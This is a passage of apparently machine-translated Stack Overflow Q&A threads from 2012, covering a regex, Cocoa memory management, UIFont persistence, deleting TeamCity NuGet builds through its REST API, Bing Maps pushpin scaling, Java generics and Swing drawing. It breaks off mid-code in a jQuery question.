我想要`i`分隔符之间的所有内容，但正则表达式只搜索`i`它之前和之后的字符。有没有办法制作`(?=i)`和`(?<=i)`可选？

[http://regexr.com?30mjf](http://regexr.com?30mjf)

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-18T21:40:10.200

您使用什么语言？在大多数语言中，您可以使用正则表达式拆分字符串，例如在 Python 中：

```
>>> re.split(r'i', 'aibicidieifi')
['a', 'b', 'c', 'd', 'e', 'f', ''] 
```

这里`r'i'`可以用一个字符串替换，代表更复杂的正则表达式。

或者，您可以执行以下操作：

```
(?<=i|^).*?(?=i|$) 
```

通过在前瞻和后视中添加交替的锚点，您现在仍将匹配字符串开头和结尾的字符，但是某些语言不支持可变长度后视，因此这可能不起作用。

如果您的语言不支持可变长度的lookbehinds，这里有一个仍然可以使用的替代方法：

```
(?:(?<=i)|^).*?(?=i|$) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:36:24.270

不会简单地`[^i]+`完成工作吗？

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-18T21:38:26.350

假设输入字符串和定界符与您想的一样简单，只需执行以下操作，

```
$valuesArray = explode('i', $input); 
```

然后访问创建的数组中的值。

# java - jmock-2.5.1.jar 与 jmock-junit3-2.5.1.jar

> ID：10218310
> 
> 赞同：0
> 
> 时间：2012-04-18T21:29:12.903
> 
> 标签：java, junit, jmock

jar jmock-2.5.1.jar 和 jmock-junit3-2.5.1.jar 有什么区别？

jmock-junit 是否包含这两个框架？

谢谢

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:32:53.027

从 的内容来看，它只是包含了与 JUnit**集成**`jmock-junit3-2.5.1.jar`的 JMock 类。您仍然必须有一个单独的 JUnit JAR。

# objective-c - Cocoa 内存问题，从数组中删除对象时不会回收内存

> ID：10218314
> 
> 赞同：0
> 
> 时间：2012-04-18T21:29:25.583
> 
> 标签：objective-c, xcode, macos, cocoa, osx-lion

我有一个保留/发布项目，它有一个简单的算法。我从一个 100000 个对象的可变数组开始，每隔 5 秒我在开始时删除 1000 个对象并在最后添加 1000 个对象。从理论上讲，我的内存占用应该在 Lil 延迟后保持不变，但是它会持续上升，直到达到一定数量。但是用“[array removeAllObjects]”删除它的所有对象并释放数组并不会回收所有内存，只是一部分。我在发布方案中运行，没有调试器，并使用活动监视器来跟踪内存使用情况。

```
- (void)applicationDidFinishLaunching:(NSNotification *)aNotification{
    array = [[NSMutableArray alloc] init];
    for(int i = 0; i<100000; i++){
        NSURL *url = [NSURL URLWithString:@"http://www.apple.com"];
        [array addObject:url];
    }
    self.t = [NSTimer scheduledTimerWithTimeInterval:10  target:self selector:@selector(addAndRemove:) userInfo:nil repeats:YES]; 
```

}

```
-(IBAction)addAndRemove:(id)sender{
     [array removeObjectsInRange:NSMakeRange(0, 1000)];

     for(int i = 0; i<1000; i++){
        NSURL *url = [NSURL URLWithString:@"http://www.apple.com"];
        [array addObject:url];
     }
}

-(IBAction)clear:(id)sender {
    [array removeAllObjects];    
    [array release];
    [t invalidate];
    t = nil;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:46:20.367

当您使用创建 NSURL

```
NSURL *url = [NSURL URLWithString:@"http://www.apple.com"]; 
```

您正在创建一个 Autoreleased 对象。自动释放的对象被存储在自动释放池中，并且只有在该池被清空时才会被销毁。当主运行循环触发时，主池每 60 秒刷新一次，因此您的对象释放的时间可能比您预期的要晚。

尝试将您的 for 循环包装在 @autoreleasepool { } 块中，以便立即刷新在循环内创建的任何自动释放对象，或者使用 alloc/init 创建您的 NSURL 以便它不会自动释放，例如

```
NSURL *url = [[NSURL alloc] initWithString:@"http://www.apple.com"]; 
```

然后看看这是否会改变您的内存使用情况。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-18T23:00:32.767

使用 Activity Monitor 监控内存使用情况非常不可靠。首先，您在看哪个内存领域（虚拟私有内存、真正私有内存、真正共享内存或真实内存）？

其次，当您的代码发出分配请求时，通常会直接或间接地发送到 malloc 例程。malloc 例程尝试从它已经拥有的内存中满足您的请求。如果它不能，那么它会向系统请求更多。当您释放内存时，它会返回到 malloc。Malloc 不一定会将其返回给系统。它可以让它更快地满足未来的请求。因此，您可能不会看到进程的内存使用量下降，至少不会一直下​​降，即使您的程序正在释放它分配的所有内容。

检查程序是否正确管理内存的正确方法是将 Instruments 与 Leaks and Allocations 工具一起使用。

# iphone - 可以将 UIFont 对象保存到 NSUserDefaults

> ID：10218315
> 
> 赞同：0
> 
> 时间：2012-04-18T21:29:30.550
> 
> 标签：iphone, xcode, nsuserdefaults, uifont

我试图让 iPhone 应用程序用户通过设置自定义字体来个性化应用程序。我想知道是否可以将 UIFont 对象保存到 NSUserDefaults。设置字体和字体大小然后保存对象会使事情变得容易得多。代码示例也会很棒。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T23:05:14.387

我会创建一个类别来隐藏复杂性 - 你可以从这样的开始

。H

```
// NSUserDefaults+CustomFontAdditions.h

@interface NSUserDefaults (CustomFontAdditions)

- (UIFont *)ps_fontForKey:(NSString *)fontKey;
- (void)ps_setFont:(UIFont *)font forKey:(NSString *)fontKey;

@end 
```

.m

```
// NSUserDefaults+CustomFontAdditions.m

#import "NSUserDefaults+CustomFontAdditions.h"

NSString * const PSCustomFontsKey        = @"PSCustomFontsKey";
NSString * const PSCustomFontKeyFontName = @"PSCustomFontKeyFontName";
NSString * const PSCustomFontKeyFontSize = @"PSCustomFontKeyFontSize";

@implementation NSUserDefaults (CustomFontAdditions)

- (UIFont *)ps_fontForKey:(NSString *)fontKey;
{
    NSDictionary *fonts = [self dictionaryForKey:PSCustomFontsKey];

    UIFont *font = nil;

    if (fonts) {
        NSDictionary *fontComponents = [fonts valueForKey:fontKey];

        NSString *fontName = [fontComponents valueForKey:PSCustomFontKeyFontName];
        CGFloat   size     = [[fontComponents valueForKey:PSCustomFontKeyFontSize] floatValue];

        font = [UIFont fontWithName:fontName size:size];
    }

    return font;
}

- (void)ps_setFont:(UIFont *)font forKey:(NSString *)fontKey;
{
    NSMutableDictionary *fonts = [[self dictionaryForKey:PSCustomFontsKey] mutableCopy];

    if (!fonts) {
        fonts = [[NSMutableDictionary alloc] initWithCapacity:1];
    }

    NSDictionary *fontComponents = [[NSDictionary alloc] initWithObjectsAndKeys:
                                    font.fontName, PSCustomFontKeyFontName,
                                    [NSNumber numberWithFloat:font.pointSize], PSCustomFontKeyFontSize, nil];

    [fonts setValue:fontComponents forKey:fontKey];

    [self setObject:fonts forKey:PSCustomFontsKey];
}

@end 
```

用法看起来像

```
NSUserDefaults *standardUserDefaults = [NSUserDefaults standardUserDefaults];
[standardUserDefaults ps_setFont:[UIFont systemFontOfSize:12.0f] forKey:@"font1"];
[standardUserDefaults ps_setFont:[UIFont fontWithName:@"Helvetica Neue" size:24.0f] forKey:@"font2"];
[standardUserDefaults synchronize];

NSLog(@"%@", [standardUserDefaults ps_fontForKey:@"font1"]);
NSLog(@"%@", [standardUserDefaults ps_fontForKey:@"font2"]); 
```

输出：

```
#=> 2012-04-19 00:01:21.756 ma[1340:f803] <UICFFont: 0x68a18b0> font-family: "Helvetica"; font-weight: normal; font-style: normal; font-size: 12px
#=> 2012-04-19 00:01:21.765 ma[1340:f803] <UICFFont: 0x6b99670> font-family: "Helvetica Neue"; font-weight: normal; font-style: normal; font-size: 24px 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T22:50:34.690

这些是可以存储在 NSUserDefaults 中的项目：

> NSData、NSString、NSNumber、NSDate、NSArray 或 NSDictionary

你可以这样做：

```
NSDictionary *fontInformation = [NSDictionary dictionaryWithObjectsAndKeys:
@"YOUR_FONTS_NAME", "fontName",
[NSNumber numberWithInt:14], @"fontSize", nil];

[[NSUserDefaults standardUserDefaults] setObject:fontInformation forKey:@"fontInfo"]; 
```

然后稍后您可以从 NSUserDefaults 中获取 NSDictionary 并重新创建 UIFont。

# c++ - 在 QVTKWidget 渲染器中添加和删除 vtkChartXY/vtkContextView

> ID：10218316
> 
> 赞同：1
> 
> 时间：2012-04-18T21:29:36.120
> 
> 标签：c++, qt, vtk

我目前有一个 Qt `MainWindow`，其中包含许多控件，包括`QVTKWidget`. 我可以`vtkChartXY`使用 a 轻松地将对象添加`vtkContextView`到`QVTKWidget`：

```
vtkSmartPointer<vtkContextView> m_2Dview = vtkSmartPointer<vtkContextView>::New();
m_2Dview->SetRenderWindow(this->QVTKWidget->GetRenderWindow()); 
```

但是，一旦我将它放在 中`QVTKWidget`，我就找不到返回 3d 视图的方法。我尝试使用`vtkContextActor`，但它导致了交互问题。但是，如果可行的话，我愿意尝试任何建议`vtkContextActor`。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-27T16:31:30.073

我为解决这个问题所做的就是通过在首先存储指针后从指针中删除来重置`vtkrenderer`on ，然后将我存储的渲染器添加回.`vtkrenderwindow``vtkrenderer``vtkRenderWindow``vtkRenderer``vtkRenderWindow`

这至少为我重置了视图，下面是我使用的片段。

`AnalysisWindow`是我指向实际的`vtkRenderer`.

```
if(AnalysisWindow != NULL)
{
    vtkSmartPointer<vtkRenderWindow> win;
    win = AnalysisWindow->GetRenderWindow();
    win->RemoveRenderer(AnalysisWindow);
    win->AddRenderer(AnalysisWindow);
} 
```

# teamcity - 如何在 TeamCity Nuget Feed 上删除特定版本的包？

> ID：10218318
> 
> 赞同：59
> 
> 时间：2012-04-18T21:29:40.640
> 
> 标签：teamcity, nuget, nuget-package, nuget-server, teamcity-7.0

有谁知道要删除 TeamCity Nuget Feed 上特定版本的软件包？

* * *

## 回答 #1

> 赞同：50
> 
> 时间：2015-10-09T10:38:47.863

## 现在通过 Web UI 支持此功能

只需打开构建并选择`Actions`>即可删除有问题的构建`Remove`。这会从 TeamCity 的列表中删除构建，**并且还会从 Nuget 提要中删除该特定构建的所有构建工件**。

* * *

## 回答 #2

> 赞同：35
> 
> 时间：2012-08-13T16:31:46.053

我知道这是很久以前问过的，但我仍然时不时地遇到这个问题，而且我总是忘记怎么做，所以我想我会发布我认为可能会稍微容易一些的解决方案（取决于你的样子在它）。

基本上，我运行了一个 TeamCity 构建，不幸的是，它创建了一个 3rd 方包的 duff 版本，我试图重新创建它，但做了一些修改。它没有用，但这意味着我总是在包管理器中看到这个 duff 包，并且在第 3 方发布更新版本之前它会保持这种状态。因此，我想从 TeamCity Nuget 服务器中删除包，而我能找到的唯一方法是删除构建，该构建也会删除人工制品（在本例中为 duff Nuget 包）。

现在，除了使用 REST API 之外，我看不到删除构建的方法，所以这就是我使用的方法（我希望我不是愚蠢的，实际上有一种从 UI 中删除构建的简单方法）。我使用 fiddler 来生成 DELETE 命令。这是通过简单地发布一个类似于我在下面显示的删除请求来实现的：

从提琴手转到作曲家窗口。选择“删除”而不是“获取”，然后在下面的表格中输入您的 TeamCity 网址：

```
http://<server>:<port>/httpAuth/app/rest/builds/<build ID> 
```

当您从 TeamCity 中选择要删除的构建时，只需检查 URL 即可找到构建 ID（查找“buildId”查询参数后的数字）。唯一的其他步骤是将授权标头添加到命令中。在“请求标头”窗口中的“用户代理”下方的行中输入以下内容。

```
Authorization: Basic (Username:Password encoded as base64) 
```

要将您的用户名/密码编码为 base64，请转到 fiddler 中的工具->文本向导，然后以这种格式输入您的 TeamCity 详细信息 - 用户名：密码。最后，您应该选择“执行”按钮，一切顺利，构建将与 Nuget 包一起被删除。

这对我有用，但显然在执行所有这些操作时要小心，因为您不想删除错误的构建。首先备份/快照您的 TeamCity 服务器可能是谨慎的做法。

希望这可以帮助某人。

* * *

## 回答 #3

> 赞同：17
> 
> 时间：2012-05-14T19:57:59.077

首先， TeamCity似乎[还不直接支持删除临时 NuGet 包。](http://devnet.jetbrains.net/message/5456081#5456081)JetBrains存在一个[未解决](http://youtrack.jetbrains.com/issue/TW-19959)的问题，但目前没有计划修复。也就是说，我们设计了一种解决方法，使我们解决了我们的具体问题，并且可能对您的问题有所帮助。

我们有一系列使用不正确（加速）版本的 nupkg 文件。因此，它们似乎比我们现在创建的包“更新”。由于无法仅删除不正确的版本，我们将每个单独的 TeamCity 构建配置的“清理工件”策略设置为较短的窗口（2 天）并运行清理。您将需要系统管理员权限才能执行此操作。

这删除了比上一个工件早一天的任何工件，并清除了我们所有的坏包。我们通过 NuGet 命令行`List`命令验证了这一点。由于更新的包是正确的，我们现在只在我们的 NuGet 源中宣传好的包。

诚然，这是一个“精确核弹”选项，可能并不适合所有人。我希望 TeamCity 在不久的将来完全支持 NuGet 命令行 API。

* * *

## 回答 #4

> 赞同：8
> 
> 时间：2015-08-13T09:28:44.680

这是我第三次找到这个帖子，因为我有类似的问题。事实证明，[jetbrains 的票证](https://youtrack.jetbrains.com/issue/TW-19959)很久以前就关闭了 - 现在 TeamCity（至少我们的 9.1 版）通过打开特定构建的详细信息直接支持这一点，单击“操作”下拉菜单，然后选择“删除.. ."。这将从 TeamCity 中删除构建以及从 nuget 包存储库中删除工件 - 从而完全消除以稍微复杂的方式调用 REST api 的需要。

发布了这个，我什至可能自己记得，下次我需要这样做的时候。

* * *

## 回答 #5

> 赞同：4
> 
> 时间：2014-09-24T07:16:51.573

我按照罗杰斯国王的回答创建了一个 powershell 脚本来执行此操作。

将此脚本另存为 tc_deletebuild.ps1 ...

```
param($build, $teamcityhost, $username, $password)

$encodedcredentials = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($username+":"+$password))

Invoke-WebRequest -Uri "http://$teamcityhost/httpAuth/app/rest/builds/id:$build" -Method Delete -Headers @{"Authorization"="Basic $encodedcredentials"} 
```

...并从powershell执行

```
.\tc_deletebuild.ps1 <buildid> <host> <username> <password> 
```

* * *

## 回答 #6

> 赞同：2
> 
> 时间：2014-11-28T22:11:28.503

正如其他人所提到的，[JetBrains 建议的解决方法](https://youtrack.jetbrains.com/issue/TW-287#comment=27-311608)是删除生成您想要删除的*工件*的构建（即NuGet*包）。*

使用 curl 7.3x（可在 ubuntu 和 Git for Windows / msysgit 上找到），以下命令删除内部版本号 42：

```
curl -v -u <username>:<password> -X DELETE http://teamcity:8111/httpAuth/app/rest/builds/42 
```

*   使用**短选项**（`-X`代替`-request`，`-u`代替`-user`）；长选项对我不起作用。
*   `:<password>`如果要提示您输入密码，请省略。
*   的响应`HTTP/1.1 204 No Content`表示成功。

完整文档：[http ://confluence.jetbrains.com/display/TCD8/REST+API#RESTAPI-Generalinformation](http://confluence.jetbrains.com/display/TCD8/REST+API#RESTAPI-Generalinformation)

* * *

## 回答 #7

> 赞同：2
> 
> 时间：2015-01-12T02:41:06.507

扩展罗杰国王的答案......邮递员 REST 客户端 chrome 扩展是一种使用很少工具即可实现它的简单方法。

```
> HTTP GET to http://servername:port/httpAuth/app/rest/builds/ 
```

输出看起来像

```
<builds count="100" nextHref="/httpAuth/app/rest/builds?count=100&amp;start=100">
    <build id="48459" number="1.0.187-nightly" ... etc 
```

在与您在 teamcity 中看到的内部版本号相同的标签上搜索您的构建 ID 的输出，然后

```
> HTTP DELETE to http://servername:port/httpAuth/app/rest/builds/*theid* 
```

我不需要授权标签或任何其他标题，可能是因为我在另一个窗口中登录了 teamcity，或者我们已将 teamcity 配置为在内部打开，但您可能需要将它们弹出到 url 和标题中。

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2014-05-15T10:44:17.360

为了扩展罗杰国王的回答，我在 Fiddler 中使用了稍微不同的请求方式。我向特定的 Teamcity 构建发出了 Get 请求，并从 Chrome 开发人员工具中获取了 http 标头。将它们复制并粘贴到 Fiddler 的请求标头框中。这样我就不必对用户名和密码进行编码。

# ajax - 如何处理 Bing 地图中的大量图钉

> ID：10218320
> 
> 赞同：6
> 
> 时间：2012-04-18T21:29:45.527
> 
> 标签：ajax, bing-maps, pushpin

我将 Bing Maps 与 Ajax 一起使用，我有大约 80,000 个位置可以放置图钉。该功能的目的是允许用户搜索路易斯安那州的餐馆并单击图钉以查看健康检查信息。

显然，一次在地图上拥有 80,000 个图钉并没有多大好处，但我正在努力寻找解决这个问题的最佳方法。另一个问题是这些地点之间的距离非常小（所有 80,000 人都在路易斯安那州）。我知道我可以使用聚类来避免地图混乱，但似乎这仍然会导致性能问题。

我目前正在尝试做的是在某个缩放级别之前不显示任何引脚，然后仅在当前视图中显示引脚。我目前尝试这样做的方法是使用 viewchangeend 事件来查找地图的缩放级别和边界，然后查询数据库（通过 Web 服务）以获取该范围内的任何点。

感觉就像我正在以错误的方式解决这个问题。有没有更好的方法来管理如此大量的数据？最好先尝试加载所有点，然后在手头有数据，而不必每次地图移动时都访问我的网络服务。如果是这样，我会怎么做？

我一直无法找到问题的答案，这通常意味着我问错了问题。如果有人可以帮助我找出正确的问题，将不胜感激。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-04-19T21:41:04.703

好吧，我已经实现了一个稍微不同的方法。这只是一个有趣的练习，但我正在使用 HTML5 画布在 Bing 地图中显示我的所有数据（大约 140.000 点）。

我之前将所有数据加载到客户端。然后，我优化了绘图过程，将其附加到“Viewchange”事件（在视图更改过程中一直触发）。

我在博客上写过这个。你可以[在这里查看](http://build-failed.blogspot.pt/2012/02/bing-maps-and-html5-part-4-final.html)。

我的示例没有交互，但可以轻松完成（对于博客文章来说应该是一个不错的主题）。因此，您必须手动处理事件并自己搜索相应的点，或者，如果要绘制的点数和/或缩放级别低于某个阈值，则显示常规图钉。

* * *

无论如何，如果您不限于 Bing 地图，另一种选择是使用[Leaflet](http://leaflet.cloudmade.com/)之类的。它允许您创建一个 Canvas 层，它是一个基于图块的层，但使用 HTML5 画布在客户端呈现。它开启了一系列新的可能性。[例如，在GisCloud](http://www.giscloud.com)中查看[这张](http://www.giscloud.com/map/16671/a-world-of-a-million-points)地图。

* * *

另一种选择，虽然更适合静态数据，但使用一种称为 UTFGrid 的技术。开发它的小伙子们当然可以比我更好地[解释](http://mapbox.com/blog/how-interactivity-works-utfgrid/)它，但它可以根据你想要的分数进行缩放，并且表现出色。它包括一个带有您的信息的图块层，以及一个随附的 json 文件，其中包含描述图块上特征的“ascii-art”文件。然后，使用一个名为[wax](http://mapbox.com/wax/)的库，它提供了完整的鼠标悬停、鼠标单击事件，而不会对性能产生任何影响。

我也写过关于它的[博客。](http://build-failed.blogspot.pt/2012/03/custom-map-tiles-part-2-tilemill.html)

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-19T18:49:38.323

我认为如果你能侥幸使用它，集群将是你最好的选择。您说您尝试使用集群，但仍然导致性能问题？我在[V7 Interactive SDK](http://www.bingmapsportal.com/ISDK/AjaxV7#LoadingDynamicModule1)上用 80000 个数据点对其进行了测试，它似乎表现良好。通过转到链接并更改`Load module - clustering`选项卡中的行来自己测试它：

```
TestDataGenerator.GenerateData(100,dataCallback); 
```

到

```
TestDataGenerator.GenerateData(80000,dataCallback); 
```

然后按下`Run`按钮。有这么多数据点，我的表现似乎可以接受。

# java - 在多线程中运行的类中的变量范围存在问题

> ID：10218321
> 
> 赞同：0
> 
> 时间：2012-04-18T21:29:48.680
> 
> 标签：java

我有这样的事情：

```
 import java.io.FileInputStream;
    import java.io.FileOutputStream;
    import java.io.OutputStream;
    import java.util.HashMap;
    import java.util.Map;
    import javax.xml.stream.*;
    import javax.xml.stream.events.*;

    public class MyClass implements javax.xml.stream.StreamFilter
    {
        private Map myMap= new HashMap();

        public Map getMap()
        {
            return this.myMap;
        }

        public void addElement(String text)
        {
            this.myMap.put(text, "value");
        }

        public void doSomething(String strValue)
        {

            try
            {
                XMLInputFactory xmlif = null;
                xmlif = XMLInputFactory.newInstance();          
                FileInputStream fis = new FileInputStream("myFile.xml");
                XMLStreamReader xmlr = xmlif.createFilteredReader(xmlif.createXMLStreamReader(fis),new MyClass());

                XMLOutputFactory outputFactory = XMLOutputFactory.newInstance();
                OutputStream fileStream = new FileOutputStream("myFileOutput");
                XMLStreamWriter xmlWriter = outputFactory.createXMLStreamWriter(fileStream);

                addElement(strValue);
                System.out.println(getMap().size()+"Before");
                while (xmlr.hasNext())
                {
                    write(xmlr, xmlWriter);
                    xmlr.next();
                }
                System.out.println(getMap().size()+"After");
            }
            catch(Exception e)
            {
                e.printStackTrace();
            }

        }

        public boolean accept(XMLStreamReader reader)
        {
            System.out.println(getMap().size()+"inside");
            if ( getMap().containsKey("Something") )
            {
                System.out.println("The value is there");
            }
            return true;
        }

        private void write(XMLStreamReader xmlr, XMLStreamWriter writer) throws XMLStreamException
        {
            switch (xmlr.getEventType()) {
                case XMLEvent.START_ELEMENT:
                    String localName = xmlr.getLocalName();
                    writer.writeStartElement(localName);
                break;
            }
        }   
    } 

```

当我将**tagMap**创建为静态时，它可以工作，但是由于我会将此类放在线程中，因此所有映射都将指向同一个映射，从而使比较无用。具体来说，我已经看到在函数接受内部，地图有 0 个值。

函数 accept 是接口 SteamFilter 的一部分，因此当事件发生时会自动调用它。我尝试将地图更改为公共，甚至使用构造函数设置值，但它是相同的。

在创建类的类中调用它的方式是：

```
 Runnable runClass = new Runnable(){
        public void run(){
            try
            {
                MyClass myC = new MyClass();
                myC.doSomething("value");
            }
            catch (Exception e)
            {
                e.printStackTrace();
            }
        }
    }
    Thread myTask = new Thread(runClass);
    myTask.start(); 

```

你知道我如何检查函数接受内的地图值吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:36:41.810

您使用 MyClass 的新实例（尚未调用的实例）实例化您的 FilterReader `doSomething`。如果您改为使用当前正在处理的同一实例启动它，它应该可以工作。

改变：

```
xmlif.createFilteredReader(xmlif.createXMLStreamReader(fis),new MyClass()) 
```

到

```
xmlif.createFilteredReader(xmlif.createXMLStreamReader(fis),this) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-18T21:34:34.243

1.  我假设每个线程都引用了 MyMap 的一个实例（可能是*同一个*实例）。

2.  他们应该能够在引用上调用 getMap() 。

问：我错过了什么？？？？

# java - 是否可以一次声明和实现一个方法，但改变返回类型以以稳健的方式匹配子接口？

> ID：10218333
> 
> 赞同：2
> 
> 时间：2012-04-18T21:30:27.913
> 
> 标签：java, generics, design-patterns, polymorphism, code-reuse

首先，我想说这没有用例。我唯一想做的就是探索这是否可能。

我想要做的是将基本接口中方法的返回签名“重新命名”为子接口的返回签名。

目标：声明和实现一个方法一次，但改变返回类型以匹配子接口。我已经想出了在某些情况下如何实现这一点，但在某些情况下它会崩溃。

想象一下，如果我有基本接口 B，并且它有一个方法 B doWork()。此外，还有一个实现 doWork() 的 B 实现。由于 doWork() 的性质，这个实现应该是唯一存在的。

现在，使用泛型很容易做到这一点。对于上面的例子：

```
interface B<T extends B> {
    T doWork();
}

class BImpl<T extends B> implements B<T> {
    @Override
    public T doWork() { return something; }
} 
```

子接口/实现可能看起来像这样：

```
interface C extends B<C> {
    void somethingCSpecific();
}

class CImpl extends BImpl<C> implements C {
    @Override
    public void somethingCSpecific() {   }
} 
```

任何构建 CImpl 的人都会看到 doWork() 返回一个 C。

```
C obj = new CImpl().doWork()  // The money shot.  No casting needed. 
```

这就是它崩溃的地方......想象B现在看起来像这样：

```
public interface B<T extends B> {
    T thisOrThat(T that);
    boolean something();
} 
```

我想在 BImpl 中做到这一点：

```
class BImpl<T extends B> implements B<T> {
    @Override
    public T thisOrThat(T that) {
        if (that.something())
            return that;
        return this;  //  Error!!  _this_ might be a different T than _that_.
    }
    @Override
    public boolean something()  { return whatever; }
} 
```

注意错误发生的位置。

显然，如果没有不安全和可疑的演员阵容，这是行不通的。但是如果我知道上面 thisOrThat 方法中*this的实现与**that*的实现是一样的，一切都会好起来的。

所以，对于我的问题。有没有办法在不知道先验类型的情况下将*这个*和*那个限制为同一类型？*

或者也许有不同的方法可以做到这一点，但结果相同？即只需声明并实现 thisOrThat() 一次，但返回类型是否适应子接口？

谢谢。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-18T22:49:58.310

使您的类`BImpl`抽象并为其添加一个*视图*方法，该方法由扩展您的抽象基类的特定类实现：

```
public abstract class BImpl<T extends B<T>> implements B<T> {
   @Override
   public T thisOrThat(T that) {
       if (that.something())
           return that;
       return this.asT();
   }

    @Override
    public boolean something() {
        // TODO Auto-generated method stub
        return false;
    }

    protected abstract T asT();
} 
```

您的每个类仍然需要实现`T asT()`，但这很简单并且可以在没有警告的情况下编译：

```
public class C extends BImpl<C> implements B<C> {
    @Override
    protected C asT() {
        return this;
    }
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-18T21:46:02.350

如果我正确理解您的问题，那么解决它的方法是使用一种自引用泛型：`B<T extends B<T>>`.

我认为您想要的是`class BImpl implements B<BImpl>`，在这种情况下，所有类型都会正常检查。

# google-chrome-extension - 通过扩展 javascript 访问扩展样式表

> ID：10218334
> 
> 赞同：0
> 
> 时间：2012-04-18T21:30:30.420
> 
> 标签：google-chrome-extension

我有一个 chrome 内容脚本扩展，其中包含一个捆绑到扩展 CRX 中的 css 文件 (mystyle.css)。据我所知，有两种方法可以将此样式表注入到页面内容中。

无论样式表以哪种方式注入页面，我都无法访问与该样式表关联的 CSS 规则。

注入方法#1：

```
// From a script running in the context of background.html:
chrome.tabs.insertCSS(tab.id, {file: 'mystyle.css'}); 
```

注入方法#2：

```
// From a script running in the context of the content, already
// injected by the background page via chrome.tabs.executeScript.
var fileref = document.createElement("link");
fileref.setAttribute("rel", "stylesheet");
fileref.setAttribute("type", "text/css");
fileref.setAttribute("href",
    chrome.extension.getURL('mystyle.css')); 
```

从在内容上下文中运行的 JavaScript 中，由后台页面注入，当使用方法 #1 注入样式表时，我无法在 document.styleSheets 中列出的列表中看到样式表。当使用方法 #2 注入时，它会与 chrome-extension:// href 一起列出，但该工作表的 cssRules 属性始终为空。

对于链接到来自其他域的文档的 CSS 工作表，我希望这是这样，但我的脚本应该可以访问与我的扩展相关的 chrome-extension:// URI。

我目前正在调查的途径是对 CSS 文件的资源内容的原始字符串访问，我可以为其构建一个 chrome-extension:// URI。我不知道这是否会比其他尝试更好，但似乎应该这样做。

# c# - 检查 WPF OnKeyUp 事件中的键是否为特殊字符

> ID：10218336
> 
> 赞同：0
> 
> 时间：2012-04-18T21:30:32.933
> 
> 标签：c#, wpf, event-handling

我为 RichTextControl 创建了一个 OnKeyUp 方法，我想忽略所有键，它们是特殊字符（如 shift、control、alt 等）。

一种方法是枚举我想忽略的所有字符，但我想知道，如果某处有类似 IsSpecialKey 函数的东西，我可以在这种情况下使用

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:50:35.033

我认为您可以在[KeyEventArgs的](http://msdn.microsoft.com/en-us/library/1660kh1c.aspx)[KeyCode](http://msdn.microsoft.com/en-us/library/system.windows.forms.keyeventargs.keycode.aspx)属性上使用[Char.IsControl](http://msdn.microsoft.com/en-us/library/18zw7440.aspx)方法，如下所示：

```
KeysConverter kc = new KeysConverter();
if (!Char.IsControl(Convert.ToChar(kc.ConvertToString(e.KeyCode))))
{
    ...
} 
```

# java - 用Java画一个圆

> ID：10218337
> 
> 赞同：1
> 
> 时间：2012-04-18T21:30:35.227
> 
> 标签：java, swing, paintcomponent, jcomponent

我想画一个具有以下属性的圆圈：

*   中心是用户在窗口上第一次点击鼠标的点
*   半径应该是第一次单击鼠标和释放鼠标（即鼠标拖动）之间的距离长度。

这是我到目前为止所拥有的，但它没有做我需要做的事情：

```
package assignment;

import java.awt.*;
import java.awt.event.MouseEvent;
import java.awt.event.MouseListener;

import javax.swing.*;

public class DrawCircle extends JFrame implements MouseListener
{
    private int centerX;
    private int centerY;
    private int endPtX;
    private int endPtY;
    private double radius;
    private double w;
    private double h;
    private CirclePanel circPanel;

    /** constructor **/
    public DrawCircle() 
    {
        this.setTitle("Click to Draw Circle");
        this.setSize(500, 500);
        this.setPreferredSize(new Dimension(500, 500));
        this.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        this.setVisible(true);
        this.setResizable(false);
        this.addMouseListener(this);
        this.circPanel = new CirclePanel();
        this.circPanel.setPreferredSize(new Dimension(500, 500));
        this.add(this.circPanel);
        pack();
    }

    public void mousePressed(MouseEvent e)
    {
        centerX = e.getX();
        centerY = e.getY();
        circPanel.set(centerX, centerY, radius, radius);
        repaint();
        pack();
    }

    public void mouseReleased(MouseEvent e)
    {
        endPtX = e.getX();
        endPtY = e.getY();

        radius = Math.sqrt(Math.pow(endPtX - centerX, 2) + Math.pow(endPtY - centerY, 2));
    }
    public void mouseEntered(MouseEvent e) {}
    public void mouseExited(MouseEvent e) {}
    public void mouseClicked(MouseEvent e){}

    //circle panel
    private class CirclePanel extends JComponent
    {
        private int x;
        private int y;
        private int w;
        private int h;

        public void set(int x, int y, double width, double height)
        {
            this.x = x;
            this.y = y;
            w = (int) width;
            h = (int) height;
        }

        public void paintComponent(Graphics g)
        {
            g.drawOval(x, y, w, h);
        }
    }

    //main method
    public static void main (String [] args)
    {
        new DrawCircle();
    }
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-18T21:34:12.663

看起来你正在做

```
circPanel.set(centerX, centerY, radius, radius);
repaint();
pack(); 
```

在错误的位置，您不应该在用户放开鼠标之前绘制圆，因为那是设置半径的时候，而在此之前半径为 0，因此没有绘制任何内容。尝试将其移至`mouseReleased`方法。

# javascript - IE9 不反映 javascript 对页面的更改

> ID：10218338
> 
> 赞同：1
> 
> 时间：2012-04-18T21:30:37.150
> 
> 标签：javascript, jquery, html, google-chrome, internet-explorer-9

我正在使用 jQuery 来更改页面元素，并且代码似乎正在运行（成功），但页面实际上并没有立即更新。Chrome 中的一切都很稳定，但 IE9 很奇怪。

JavaScript：

```
$(document).ready(function() {
    $('body').on('change', '.Hours', function () {
        var hoursElement = this;
